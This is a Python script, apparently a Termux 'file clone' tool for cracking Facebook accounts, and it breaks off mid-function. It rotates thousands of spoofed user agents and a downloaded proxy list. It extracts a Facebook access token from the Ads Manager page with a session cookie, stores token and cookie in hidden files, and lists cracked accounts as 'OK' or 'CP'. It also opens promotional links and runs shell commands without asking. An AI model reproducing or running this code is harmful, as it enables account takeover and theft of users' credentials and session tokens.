#-----------------[ MEHEDI-King ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ MEHEDI-King ]-------------------#
import os, platform, time, sys
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip install httpx pip install beautifulsoup4')
#os.system('pip install requests ')
#os.system('pip install bs4')
#os.system('pip install rich')
#os.system('pip install urillb3')
#os.system("pkg install espeak")
#os.system("pkg update")
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mCHECKING UPDATE...? ')
os.system("espeak -a 300 \"Checking,Update,\"")
time.sleep(2)
#os.system('clear')
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mUPDATE VERSHON 1.0V...! ')
os.system("espeak -a 300 \"UPDATE VERSION 1.0,\"")
time.sleep(2)
#os.system('clear')
print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m JOIN MY FACEBOOK GORUP ..!")
os.system("espeak -a 300 \"JOIN,MY,FACEBOOK,GORUP,\"")
time.sleep(2)
os.system(f'xdg-open https://facebook.com/groups/337326185542906/')
os.system(f'xdg-open https://m.me/j/AbaeoDGTavNQds63/')
os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5839.199 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:114.0) Gecko/20010101 Firefox/114.0/b9cHZq2NzoI5QKFY",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/630.11.13 (KHTML, like Gecko) Version/13.7 Safari/630.11.13",]
ua = ["Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5762.211 Safari/537.36 Edg/111.0.1771.53",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 11_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5794.201 Safari/537.36 OPR/100.0.3231.126",]
ua = ["Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5811.209 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7; rv:114.0) Gecko/20000101 Firefox/114.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5740.216 Safari/537.36 Edg/109.0.1758.61",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5837.208 Safari/537.36 Edg/110.0.1575.42",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5765.210 Safari/537.36 OPR/100.0.3448.94",]
ua = ["Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5774.222 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 11.0; Win64; rv:115.0) Gecko/20110101 Firefox/115.0/pqU6Ene3fWwD1",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4_7) AppleWebKit/614.18.12 (KHTML, like Gecko) Version/10.0 Safari/614.18.12",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5784.220 Safari/537.36 Edg/110.0.1755.55",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5815.211 Safari/537.36 OPR/99.0.3103.51",]
ua = ["Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5761.206 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20000101 Firefox/114.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0_6) AppleWebKit/618.5 (KHTML, like Gecko) Version/11.1.97 Safari/618.5",]
ua = ["Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5776.222 Safari/537.36 Edg/112.0.1709.61",]
ua = ["Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5803.197 Safari/537.36 OPR/99.0.4433.139",]
ua = ["Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5832.222 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; rv:113.0) Gecko/20110101 Firefox/113.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.205 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5747.205 Safari/537.36 Edg/113.0.1621.49",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5787.202 Safari/537.36 OPR/99.0.2942.39",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-T507) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5754.204 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android 10.2; Mobile; rv:115.0esr) Gecko/115.0esr Firefox/115.0esr",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/629.10.1 (KHTML, like Gecko) Version/10.0 Mobile/V0W102 Safari/629.10.1",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5741.226 Safari/537.36 Edg/112.0.1647.47",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5796.219 Safari/537.36 OPR/98.0.4357.33",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-T500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5747.200 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android 10; Mobile; rv:114.0) Gecko/114.0 Firefox/114.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.3 Mobile/MEI9BH Safari/617.33",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5736.213 Safari/537.36 Edg/113.0.1540.56",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5739.223 Safari/537.36 OPR/100.0.3701.116",]
ua = ["Mozilla/5.0 (Linux; Android 11; SCM-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5743.199 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android 11; Mobile; rv:114.0) Gecko/114.0 Firefox/114.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/600.8.11 (KHTML, like Gecko) Version/10.4.55 Mobile/RUK1OV Safari/616.23",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5833.205 Safari/537.36 Edg/114.0.1772.61",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5825.218 Safari/537.36 OPR/98.0.3779.130",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-T837V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5811.212 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android 10.2; Mobile; rv:114.0) Gecko/114.0 Firefox/114.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5808.205 Safari/537.36 OPR/100.0.4220.33",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-T387V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5766.221 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android; Mobile; rv:114.0) Gecko/114.0 Firefox/114.0",]
ua = ["Mozilla/5.0 (Android; Mobile; rv:114.0esr) Gecko/114.0esr Firefox/114.0esr",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/625.18.15 (KHTML, like Gecko) Version/14.0 Mobile/7KKCJZ Safari/625.18.15",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5770.201 Safari/537.36 Edg/111.0.1801.53",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5735.197 Safari/537.36 OPR/98.0.3043.134",]
ua = ["Mozilla/5.0 (Linux; Android 11; Lenovo TB-X505X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5779.201 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android; Mobile; rv:113.0) Gecko/113.0 Firefox/113.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/600.6.20 (KHTML, like Gecko) Version/11.6.27 Mobile/RIVSV5 Safari/619.18.15",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5782.199 Safari/537.36 Edg/109.0.1743.54",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5757.223 Safari/537.36 OPR/98.0.3823.29",]
ua = ["Mozilla/5.0 (Linux; Android 11; 100003562) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5802.200 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android 10.1; Tablet; rv:115.0) Gecko/115.0 Firefox/115.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/615.21 (KHTML, like Gecko) Version/14.5 Mobile/H35JGT Safari/615.21",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5803.198 Safari/537.36 Edg/112.0.1664.50",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 11_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5845.215 Safari/537.36 OPR/99.0.4043.31",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.211 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Android; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MAHADI-143/BDMC/blob/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/tonmoy404-cyber/FILE_X/blob/main/tonmoy_ua.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ MEHEDI- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/groups/266865079324430/?ref=share_group_link')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/ashik.khan444?mibextid=b06tZ0')
logo =(f"""
\033[35;1m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[35;1m
║\033[34;1m__  __ \033[35;1m______ \033[34;1m_    _ \033[35;1m______ \033[34;1m_____ \033[35;1m_____ \033[35;1m
║\033[34;1m|  \/  \033[35;1m|  ____\033[34;1m| |  | \033[35;1m|  ____\033[34;1m|  __ \033[35;1m\_   _|\033[35;1m
║\033[34;1m| \  / \033[35;1m| |__  \033[34;1m| |__| \033[35;1m| |__  \033[34;1m| |  | |\033[35;1m| |\033[35;1m  
║\033[34;1m| |\/| \033[35;1m|  __| \033[34;1m|  __  \033[35;1m|  __| \033[34;1m| |  | |\033[35;1m| |\033[34;1m  
║\033[34;1m| |  | \033[35;1m| |____\033[34;1m| |  | \033[35;1m| |____\033[34;1m| |__| |\033[35;1m| |\033[34;1m
║\033[34;1m|_|  |_\033[35;1m|______\033[34;1m|_|  |_\033[35;1m|______\033[34;1m|_____/\033[35;1m_____|\033[34;1m
\033[35;1m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[35;1m
\033[35;1m╔══════════════•|      ✿      |•══════════════╗\033[35;1m
    \033[35;1m༄✺𓆩๛⃝TERMUX𓆩๛⃝COMMUNITY ✺࿐\033[35;1m𒄬 𓆩๛⃝AF-CYBER‣᭄𓆪\033[35;1m      
\033[35;1m╚══════════════•|      ✿      |•══════════════╝\033[35;1m
\033[35;1m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[35;1m
╠══[༄✺𓆩๛⃝CREATOR              • \33[1;38m𓆩๛⃝MEHEDI\33[1;38m     \033[1;31m                 
╠══[༄✺𓆩๛⃝MY𓆩๛⃝GITHUB           • \33[1;38m𓆩๛⃝MEHEDI-404    \33[1;34m                                 
╠══[༄✺𓆩๛⃝CONTACT              •𓆩๛⃝01*******07  \33[1;35m                                                           
╠══[༄✺𓆩๛⃝CAMAND               • 𓆩๛⃝File𓆩๛⃝clone      \33[1;32m                                                          
╠══[༄✺𓆩๛⃝VERSION              • 𓆩๛⃝1.0         \033[1;35m                                                                       
\033[35;1m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[35;1m""")
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m+\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  MEHEDI ,  V I P,  Tools"')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m+\033[1;91m]\x1b[38;5;50m USERNAME KEY: ')
    #password = input('\033[1;91m[\033[1;92m+\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'mehedi' :
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97mYOUR TOOLS ACTIVE \x1b[38;5;50m[FREE] ")
    print(f"\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m \x1b[38;5;50mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m \033[0;93mTODAY DATE :\x1b[38;5;50m "+date)
    print(f'\033[1;91m┏━───────────────────────────\033[1;37m')
    print(f"""\033[1;92m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \033[1;96mFILE CLONE""")
    print("""\033[1;92m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mFOLLOW MY FACEBOOK""")
    print(f"""\033[1;92m┣━\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[1;95mCHECK OK ID AND CP ID""")
    print("""\033[1;92m┣━\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m \x1b[38;5;50mEXIT""")
    print(f'\033[1;91m┗━───────────────────────────\033[1;37m')
    ASHIK = input('\x1b\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE: ')
    if ASHIK in ['111']:
        login()
        dump_massal()
    elif ASHIK in ['1']:
        crack_file()
    elif ASHIK in ['2','02']:
        os.system('xdg-open https://github.com/SSC-LOL')
        os.system("python nono.py")
    elif ASHIK in ['3','03']:
        result()
    elif ASHIK in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
    #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print('\x1b[38;5;50m┏━[𝟷]  \x1b[38;5;50mCHECK CP IDZ ')
    print('\x1b[38;5;50m┣━[𝟸]  \x1b[38;5;50m OK IDZ ')
    print('\x1b[38;5;50m┗━[𝟹]  \x1b[38;5;50m ')
    print('\x1b[38;5;50m═══════════════')
    kz = input(' \033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\x1b[38;5;50m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CP : \033[33m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\x1b[38;5;50m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f'\033[97;1m[\x1b[38;5;50m•\033[97;1m] OK : \033[32m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\x1b[38;5;50m==================')
        animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()
 
#-------------------[ CRACK-PUBLIK ]----------------#
 
def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
